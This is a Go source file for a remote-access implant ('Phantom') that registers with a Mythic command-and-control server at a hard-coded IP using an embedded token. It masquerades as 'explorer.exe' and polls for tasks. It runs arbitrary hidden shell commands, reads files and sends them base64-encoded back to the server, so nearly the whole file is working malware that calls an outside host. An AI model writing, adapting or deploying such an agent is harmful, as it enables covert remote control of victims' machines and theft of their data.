package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "os/exec"
        "os/user"
        "runtime"
        "strings"
        "syscall"
        "time"
)

const (
        mythicURL   = "https://37.27.249.191:7443/graphql/"
        jwtToken    = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"
        payloadUUID = "9df7dfc4-f21d-4b03-9962-9f3272669b85"
)

var (
        callbackID    string
        currentDir    string
        agentActive   = true
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   map[string]interface{} `json:"data"`
        Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
        Message string `json:"message"`
}

type Task struct {
        ID          string `json:"id"`
        CommandName string `json:"command_name"`
        Params      string `json:"params"`
        Status      string `json:"status"`
}

func logEvent(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logMsg := fmt.Sprintf("[%s] %s", timestamp, message)
        fmt.Println(logMsg)
        
        file, err := os.OpenFile("phantom_complete.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
        if err == nil {
                file.WriteString(logMsg + "\n")
                file.Close()
        }
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        payload := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return nil, err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
        if err != nil {
                return nil, err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("Authorization", "Bearer "+jwtToken)
        
        resp, err := client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        var graphqlResp GraphQLResponse
        err = json.Unmarshal(body, &graphqlResp)
        if err != nil {
                return nil, err
        }
        
        return &graphqlResp, nil
}

func registerWithMythic() error {
        logEvent("Registering callback with Mythic...")
        
        hostname, _ := os.Hostname()
        currentUser, _ := user.Current()
        username := "system"
        if currentUser != nil {
                username = currentUser.Username
        }
        
        pid := os.Getpid()
        currentDir, _ = os.Getwd()
        
        query := `
        mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
                createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
                        status
                        error
                        callback {
                                id
                                agent_callback_id
                        }
                }
        }`
        
        variables := map[string]interface{}{
                "newCallback": map[string]interface{}{
                        "ip":          "127.0.0.1",
                        "host":        hostname,
                        "user":        username,
                        "description": "Phantom C2 Agent - Full Commands",
                        "domain":      "",
                        "externalIp":  "127.0.0.1",
                        "extraInfo":   fmt.Sprintf("OS:%s ARCH:%s PID:%d DIR:%s", runtime.GOOS, runtime.GOARCH, pid, currentDir),
                        "processName": "explorer.exe",
                        "sleepInfo":   "5s",
                },
                "payloadUuid": payloadUUID,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return fmt.Errorf("GraphQL request failed: %v", err)
        }
        
        if len(resp.Errors) > 0 {
                return fmt.Errorf("GraphQL errors: %v", resp.Errors)
        }
        
        if data, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
                status := data["status"].(string)
                if status == "success" {
                        if callback, ok := data["callback"].(map[string]interface{}); ok {
                                if id, ok := callback["id"].(string); ok {
                                        callbackID = id
                                }
                                if agentID, ok := callback["agent_callback_id"].(string); ok {
                                        logEvent(fmt.Sprintf("Agent ID: %s", agentID))
                                }
                        }
                        logEvent("✓ SUCCESSFULLY REGISTERED WITH MYTHIC!")
                        return nil
                }
        }
        
        return fmt.Errorf("Registration failed")
}

func executeShellCommand(command string) string {
        logEvent(fmt.Sprintf("Executing: %s", command))
        
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", command)
        } else {
                cmd = exec.Command("/bin/sh", "-c", command)
        }
        
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        
        if err != nil {
                return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
        }
        
        return string(output)
}

func listDirectory(path string) string {
        if path == "" {
                path = currentDir
        }
        
        logEvent(fmt.Sprintf("Listing directory: %s", path))
        
        files, err := ioutil.ReadDir(path)
        if err != nil {
                return fmt.Sprintf("Error reading directory: %v", err)
        }
        
        var result strings.Builder
        result.WriteString(fmt.Sprintf("Directory listing for: %s\n", path))
        result.WriteString("========================================\n")
        
        for _, file := range files {
                fileType := "FILE"
                if file.IsDir() {
                        fileType = "DIR "
                }
                
                size := file.Size()
                modified := file.ModTime().Format("2006-01-02 15:04:05")
                
                result.WriteString(fmt.Sprintf("%s %10d %s %s\n", fileType, size, modified, file.Name()))
        }
        
        return result.String()
}

func changeDirectory(path string) string {
        logEvent(fmt.Sprintf("Changing directory to: %s", path))
        
        err := os.Chdir(path)
        if err != nil {
                return fmt.Sprintf("Error changing directory: %v", err)
        }
        
        currentDir, _ = os.Getwd()
        return fmt.Sprintf("Current directory: %s", currentDir)
}

func readFile(filepath string) string {
        logEvent(fmt.Sprintf("Reading file: %s", filepath))
        
        content, err := ioutil.ReadFile(filepath)
        if err != nil {
                return fmt.Sprintf("Error reading file: %v", err)
        }
        
        // Encode as base64 for binary files
        if len(content) > 1024 {
                encoded := base64.StdEncoding.EncodeToString(content)
                return fmt.Sprintf("File content (base64):\n%s", encoded)
        }
        
        return fmt.Sprintf("File content:\n%s", string(content))
}

func downloadFile(filepath string) string {
        logEvent(fmt.Sprintf("Downloading file: %s", filepath))
        
        content, err := ioutil.ReadFile(filepath)
        if err != nil {
                return fmt.Sprintf("Error reading file: %v", err)
        }
        
        encoded := base64.StdEncoding.EncodeToString(content)
        return fmt.Sprintf("FILE_DOWNLOAD:%s:%s", filepath, encoded)
}

func processTask(task Task) string {
        logEvent(fmt.Sprintf("Processing task: %s with params: %s", task.CommandName, task.Params))
        
        switch task.CommandName {
        case "shell":
                return executeShellCommand(task.Params)
        
        case "ls", "dir":
                return listDirectory(task.Params)
        
        case "cd":
                return changeDirectory(task.Params)
        
        case "pwd":
                dir, _ := os.Getwd()
                return fmt.Sprintf("Current directory: %s", dir)
        
        case "cat", "type":
                return readFile(task.Params)
        
        case "download":
                return downloadFile(task.Params)
        
        case "ps":
                return executeShellCommand("tasklist")
        
        case "whoami":
                user, _ := user.Current()
                return fmt.Sprintf("Username: %s", user.Username)
        
        case "ipconfig":
                return executeShellCommand("ipconfig /all")
        
        case "sysinfo":
                hostname, _ := os.Hostname()
                user, _ := user.Current()
                return fmt.Sprintf("Hostname: %s\nUser: %s\nOS: %s\nArch: %s\nPID: %d", 
                        hostname, user.Username, runtime.GOOS, runtime.GOARCH, os.Getpid())
        
        default:
                return fmt.Sprintf("Unknown command: %s", task.CommandName)
        }
}

func sendTaskResponse(taskID string, output string) error {
        logEvent("Sending task response to Mythic...")
        
        query := `
        mutation updateTask($taskId: String!, $output: String!) {
                updateTask(taskId: $taskId, output: $output) {
                        status
                }
        }`
        
        variables := map[string]interface{}{
                "taskId": taskID,
                "output": output,
        }
        
        _, err := makeGraphQLRequest(query, variables)
        return err
}

func checkForTasks() error {
        if callbackID == "" {
                return nil
        }
        
        query := `
        query getTasks($callbackId: String!) {
                task(where: {callback_id: {_eq: $callbackId}, status: {_eq: "submitted"}}) {
                        id
                        command_name
                        params
                        status
                }
        }`
        
        variables := map[string]interface{}{
                "callbackId": callbackID,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
                return nil
        }
        
        if data, ok := resp.Data["task"].([]interface{}); ok {
                if len(data) > 0 {
                        for _, taskData := range data {
                                if taskMap, ok := taskData.(map[string]interface{}); ok {
                                        task := Task{
                                                ID:          taskMap["id"].(string),
                                                CommandName: taskMap["command_name"].(string),
                                                Params:      taskMap["params"].(string),
                                                Status:      taskMap["status"].(string),
                                        }
                                        
                                        logEvent(fmt.Sprintf("Received task: %s", task.CommandName))
                                        output := processTask(task)
                                        
                                        err := sendTaskResponse(task.ID, output)
                                        if err != nil {
                                                logEvent(fmt.Sprintf("Failed to send response: %v", err))
                                        } else {
                                                logEvent("Task response sent successfully")
                                        }
                                }
                        }
                } else {
                        logEvent("No new tasks")
                }
        }
        
        return nil
}

func main() {
        logEvent("=== PHANTOM MYTHIC AGENT - COMPLETE VERSION ===")
        logEvent(fmt.Sprintf("Running on: %s %s", runtime.GOOS, runtime.GOARCH))
        logEvent(fmt.Sprintf("Process ID: %d", os.Getpid()))
        logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))
        logEvent(fmt.Sprintf("Using Payload UUID: %s", payloadUUID))
        
        // Register with Mythic
        err := registerWithMythic()
        if err != nil {
                logEvent(fmt.Sprintf("Registration failed: %v", err))
                return
        }
        
        logEvent("Starting main communication loop with full command support...")
        
        // Main loop
        for agentActive {
                err := checkForTasks()
                if err != nil {
                        logEvent(fmt.Sprintf("Error checking tasks: %v", err))
                }
                
                // Sleep with jitter
                sleepTime := 3 + (time.Now().Unix() % 4)
                time.Sleep(time.Duration(sleepTime) * time.Second)
        }
        
        logEvent("Agent shutting down")
}